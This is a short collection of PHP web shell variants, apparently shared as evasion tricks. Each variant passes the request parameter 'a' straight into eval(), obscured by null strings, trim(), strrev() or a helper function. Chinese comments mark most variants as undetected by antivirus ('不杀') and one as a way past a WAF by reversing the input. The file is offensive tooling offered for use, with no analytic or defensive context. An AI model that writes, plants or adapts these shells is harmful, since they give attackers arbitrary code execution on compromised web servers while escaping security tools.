<?php
$a = $_REQUEST['a'];
$c = null;
$b = null;
eval($c.$b.$a);
?> //不杀
<?php
$a = $_REQUEST['a'];
$c = null;
eval(trim($b.$a));
?> 
//不杀

<?php
$a = $_REQUEST['a'];
$c = null;
eval($c.$c.$a);
?> //不杀

<?php
$a = $_REQUEST['a'];
$c = null;
eval(''.$c.$a);        
}
?>//不杀

<?php
$a = $_REQUEST['a'];
$c = null;
eval($c.strrev($a));
?> // 还可以倒序过waf

<?php
$a = $_REQUEST['a'];
eval(ha().$a);        

function ha(){
        return null;
}
?>//不杀

<?php
$a = $_REQUEST['a'];
eval(ha().$a);        

function ha(){
        return '';
}
?>//不杀